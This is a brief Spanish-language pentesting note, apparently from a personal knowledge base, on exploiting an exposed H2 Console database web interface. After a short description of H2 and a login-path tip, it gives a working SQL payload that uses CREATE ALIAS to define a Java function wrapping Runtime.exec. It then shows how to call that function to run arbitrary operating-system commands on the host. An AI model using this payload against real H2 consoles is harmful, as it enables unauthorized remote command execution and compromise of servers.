----
- Tags: #teoria #practica 
- -----
# H2 Console 
### **H2 Console** es un sistema administrador de bases de datos relacionales porgramado en java. Puede ser incorporado en aplicaciones Java o ejecutarse de modo cliente-servidor. 

-----
# Explotación 

### Puede ser interesante tener en cuenta a la hora de iniciar sesión en este servicio cambiar el path (Ya que en caso de estar en uso, puede tirarnos error de inicio de sesión siendo falso.)

![[possible_login_fix_h2_consoe.png]]
### Ahora si, para abusar de este servicio web, podríamos inyectar la siguiente query SQL: 

```sql
CREATE ALIAS cmd AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
```
### Una vez ejecutada la anterior sentencia, ahora podremos hacer uso de **cmd** como función para ejecutar comandos: 

```sql
call cmd('{command_to_execute}'); 
```

